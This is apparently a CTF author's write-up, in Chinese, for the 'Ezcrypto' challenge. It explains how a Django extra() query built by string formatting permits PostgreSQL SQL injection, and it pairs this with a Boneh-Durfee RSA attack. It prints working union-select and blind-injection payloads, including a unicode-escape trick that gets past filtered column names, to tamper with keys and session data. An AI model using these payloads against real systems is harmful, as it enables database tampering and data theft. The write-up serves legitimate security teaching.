## 前言
Ezcrypto设计的初衷是上学期上密码学课的时候看了Dan Boneh的"Twenty Years of
Attacks on the RSA
Cryptosystem"，感觉很多RSA相关的攻击都是基于这篇文章提到的内容进行变形完成的，然后想着web狗应该也要会点密码学，于是出了这个题。Ezcrypto的密码学部分的确是很赤裸很简单，本质上还是一道Sql注入的题目。

### 密码学部分
本题的flag由root的密钥进行加密，且密钥生成是安全的。
但是user的密钥生成过程中，采用了从数据库中读取到的lowlimit以及uplimit作为私钥的上下界来生成。由于上界定在了0.4，因此这样的密钥生成存在有Boneh and Durfee attack的场景，即生成一个私钥的上界小于0.292时，N可以被分解。攻击脚本可以参考以下链接https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage

### 修改lowlimit
本题的第一考点就在于如何修改lowlimit以及uplimit的值。数据库操作均采用Django原生的ORM来实现，后端数据库为Postgresql。代码中只有在当前密钥加密次数用完时才会调用create_key去生成新的密钥，但是在这部分逻辑中，采用了限制很严的wafd以及限制括号次数的方式来保证不能在这部分逻辑中直接通过union select的方式来返回一个小数比如0.254之类的数，去让lowlimit和uplimit满足条件。因此我们需要在分支的第一部分中，尝试将数据库中的lowlimit和uplimit的值进行修改，在分支的第二部分中利用create_key去生成新的密钥。
我们可以很明显的发现有一处数据库操作是有问题的。
```
records = Record.objects.extra(
    where=['username=%s', 'message!=%s', 'luky!={0}'.format(luky)],
    params=[user, message]
)
```
luky处没有采用到ORM语法的方式，而是采用了类似字符串拼接的方式来传入数据。当然，Django在采用extra来做查询的时候，我也只知道了`%s`的方式来安全的传参，对于数值型数据，我没有找到对应的方法，也就是说如果你用extra来写sql查询，的确可能存在类似上述的写法的存在。  
现在的问题变成了当你拥有一处Select型的注入的时候，你怎么去修改数据库中的值。这里需要用到一个Django的ORM在实现的时候我个人认为没有做好的地方来完成这一点。因为观察代码我们知道，recordone在被select出来以后，后续会通过save函数进行更新，也就是update操作。那么如果我们将select的内容控制成我们想要的结构，意味着Django会update一个由我们控制的对象，而不是只是修改了代码中对应位置的对象。这一点在Flask中就不存在，Flask只会update在代码中显式更改的部分。  
有了一个可控的update以后，我们还需要绕过wafs中对于`.-`的限制，即你不能直接通过小数或者科学计数法来表示一个纯小数。这部分应该会有各种各样花式的方法，这里提供一种方法是利用log和round函数来做到这一点，即round(log(80,3),3)=>0.251
这部分的payload为
```
47) union select "id",round(log(80,3),3),round(log(75,3),3),"username","secretroot",U&"Nu!0073er" UESCAPE '!',U&"Eu!0073er" UESCAPE '!',"secretuser","message","luky" from "Record" where ("username"='test'
```

### 控制root密钥
第一步我们已经控制了user的密钥，使其变得不安全可以采用Boneh and Durfee attack来分解N。但是flag是有root的密钥加密的而不是user。观察代码我们可以发现，在分支的第一部分，一直采用的是session中的值进行的加密，而不是数据库中的值。而root的session中的密钥在分支第二部分重新生成时会更新。
```
request.session['root_N'] = Nroot
request.session['root_E'] = Eroot
request.session['root_flag'] = root_flag
request.session[recordone.username + '_N'] = Nuser
request.session[recordone.username + '_E'] = Euser
request.session[recordone.username + '_flag'] = user_flag
```
观察以上代码可以发现，root_N和root_E先赋值，而recordone.username由于注入存在的关系，是我们可控的，因此我们可以通过控制recordone.username来使得session中的root_N和root_E错误的被Nuser和Euser来控制。也就意味着我们可以使得flag由一组脆弱的N和e生成。
这部分的payload为
```
47) union select "id","lowlimit","uplimit",'root',"secretroot",U&"Nu!0073er" UESCAPE '!',U&"Eu!0073er" UESCAPE '!',"secretuser","message","luky" from "Record" where ("username"='test'
```

### 恢复用户名
上一步会将对应用户的用户名改变为root，这会影响到最后获取Nuser和Euser的值，因此在这里需要将用户名恢复过来。
```
47) union select "id","lowlimit","uplimit",'test',"secretroot",U&"Nu!0073er" UESCAPE '!',U&"Eu!0073er" UESCAPE '!',"secretuser","message","luky" from "Record" where ("id"=1
```
同时输入一组正常的message和luky来获得一个使用Nuser和Euser加密的flag。

### 盲注Nuser和Euser
最后一步就是获取到数据库中的Nuser和Euser用于Boneh and Durfee attack来分解。这里有两个问题。一是分支第一部分只有三次机会使用当前密钥，如果机会用完则密钥会更新。这里不存在直接回显即得的注入，只能通过盲注来完成。所以我们需要构造一个不会减少使用密钥次数的请求，且存在盲注需要的两种状态。  
关注这部分代码
```
if len(records) == 0:
    content = "<script>alert('必须修改明文和幸运数字');window.location='/';</script>"
    return HttpResponse(content)
```
我们可以通过返回0个查询来触发这种状态。
第二个状态是来自这句代码
```
user_flag = crypt(message, request.session[recordone.username + '_N'], request.session[recordone.username + '_E'])
```
因为recordone.username是我们可控的，如果是一个session中不存在的键值，Django会抛出一个500错误的响应，这样即完成了两个状态，又使得代码不会走到使用次数减少的位置。
第二个问题是，Nuser和Euser这两个列名被禁止了，同时禁止了常见的一些表列名被禁止时的做法。此处用到了Postgresql特有的一个trick，最早在hitcon2017的SQL so Hard非预期解中被提及，我感觉这个知识点国内好像不怎么提，所以特地再拿出来说一遍。Postgresql可以采用`U&"Eu!0073er" UESCAPE '!'`的方式来转义unicode字符，同时Postgresql的单引号和双引号是有明确含义的，而不是像Mysql那样存在混用的现象。即双引号可以用来表示列名而单引号则用来表示字符串。因此`U&"Eu!0073er" UESCAPE '!'`这样的表示不会存在字符串的歧义，而是准确地表示了列名的含义。  
盲注的测试payload为
```
47) union select "id","lowlimit","uplimit",'a',"secretroot",U&"Nu!0073er" UESCAPE '!',U&"Eu!0073er" UESCAPE '!',"secretuser","message","luky" from "Record" where "id"=1 and (case when (substring(U&"Nu!0073er" UESCAPE '!' from 1 for 1)='1') then true else false end
```

本题相对过程比较复杂，主要考察了RSA的基本攻击方式、Django ORM的一个问题以及Postgresql的一些特性，有点烦，所以flag原本设置也是叫`NeSE{mix_up1s-alittle^disgusting}`